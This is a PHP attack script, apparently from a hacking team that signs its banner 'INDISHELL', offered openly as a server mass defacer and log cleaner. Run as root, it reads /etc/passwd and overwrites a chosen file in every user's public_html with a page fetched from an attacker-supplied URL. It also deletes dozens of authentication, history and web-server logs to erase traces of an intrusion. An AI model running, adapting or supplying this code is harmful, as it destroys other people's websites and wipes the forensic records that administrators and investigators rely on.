<?php
error_reporting(0);
echo "\n";
echo  "                                                                                INX_ROOT\n";
echo  "                                                               Linux server mass defacer and ip log cleaner\n";
echo  "                                                              #############################################\n";
echo  "                                                                                   Team\n                                                                          --==[[ INDISHELL ]]==--          \n";
echo  "                                                                              Indian Cyber Army\n                                                              ############################################# \n";



echo  "                                                                          -==[[Greetz to]]==--
   Guru ji zero,code breaker ica,root_devil,google_warrior,INX_r0ot,Darkwolf indishell,Baba,Silent poison India,Magnum sniper,Atul Dwivedi,\n      ethicalnoob Indishell,cool toad,cool shavik, Ebin V Thomas,Dinelson Amine,Th3 D3str0yer,SKSking,cyberwarrior,Mr. Trojan,rad paul,Godzila,mike waals,\n  Neo hacker ICA, Local root,Irfninja indishell,Golden boy INDIA,Ketan Singh,Yash,Reborn India,Alicks,Aneesh Dogra,silent hacker,lovetherisk,\n     Suriya Prakash,cyber gladiator,Cyber Ace,hero,Minhal Mehdi ,Raj bhai ji,cold fire hacker,Mannu, ViKi ,Budhaoo, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand \n                                                                   and rest of TEAM INDISHELL\n";
echo "                                                    ##############################################################\n";
echo  "                                                       --==[[  code for india,Hack for India,Die for India ]]==--\n\n";echo  "                                                   ===============================================================\n";                               
echo "                                                              this script must run with the power of root user \n";


echo "                                                    press 1 for server mass deface and press 2 for ip log cleanup  \n   ";
echo "                                               ================================================================\n";
echo "                                                                    \n   ";
$x=trim(fread(STDIN,80));
if($x == 1)
{
echo "                                        you have decided to deface server , ok ...give me file name which you want to deface like index.php\n ";
$filename=trim(fread(STDIN,80));
echo "                                                                give me deface page link over http :P\n";
$e=trim(fread(STDIN,800)); 
$te1 = ereg_replace("(https?)://", "", $e);
	    $te = ereg_replace("www.", "", $te1);
	    $link="http://".$te;

$fdata=file_get_contents($link);



echo "\n                              cool ... file $filename ko deface kerne ke tayaari ho gai h ...wait a minute bhai ji , i am starting \n";

chdir('/');
$users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
$usr=$str[0];


	echo "\n\n                                        checking public_html directory of user ".$usr."\n";
$userhome="/home/".$usr."/public_html/";
if(is_dir($userhome))
{
echo "                              public_html exist for user $usr ....time to deface file  $filename \n";
$defaceit=$userhome.$filename;
$open=fopen($defaceit,'w');
fwrite($open,$fdata);


}
}
}
elseif($x == 2)
{
	

echo "                                                              safai abhiyaan chalu hota h abhi :P\n";	
	chdir('/');
	
	$log_files =array("/var/log/lastlog", "/var/log/telnetd", "/var/run/utmp",
"/var/log/secure","/root/.ksh_history", "/root/.bash_history",
"/root/.bash_logut", "/var/log/wtmp", "/etc/wtmp",
"/var/run/utmp", "/etc/utmp", "/var/log", "/var/adm",
"/var/apache/log", "/var/apache/logs", "/usr/local/apache/logs",
"/usr/local/apache/logs", "/var/log/acct", "/var/log/xferlog",
"/var/log/messages/", "/var/log/proftpd/xferlog.legacy",
"/var/log/proftpd.xferlog", "/var/log/proftpd.access_log",
"/var/log/httpd/error_log", "/var/log/httpsd/ssl_log",
"/var/log/httpsd/ssl.access_log", "/etc/mail/access",
"/var/log/qmail", "/var/log/smtpd", "/var/log/samba",
"/var/log/samba.log.%m", "/var/lock/samba", "/root/.Xauthority",
"/var/log/poplog", "/var/log/news.all", "/var/log/spooler",
"/var/log/news", "/var/log/news/news", "/var/log/news/news.all",
"/var/log/news/news.crit", "/var/log/news/news.err",
"/var/log/news/news.notice",
"/var/log/news/suck.err", "/var/log/news/suck.notice",
"/var/spool/tmp", "/var/spool/errors", "/var/spool/logs", "/var/spool/locks",
"/usr/local/www/logs/thttpd_log", "/var/log/thttpd_log",
"/var/log/ncftpd/misclog.txt", "/var/log/nctfpd.errs",
"/var/log/auth");
foreach ($log_files as $file)
{
	unlink($file);
	
	
	}
	
	
	}


?>
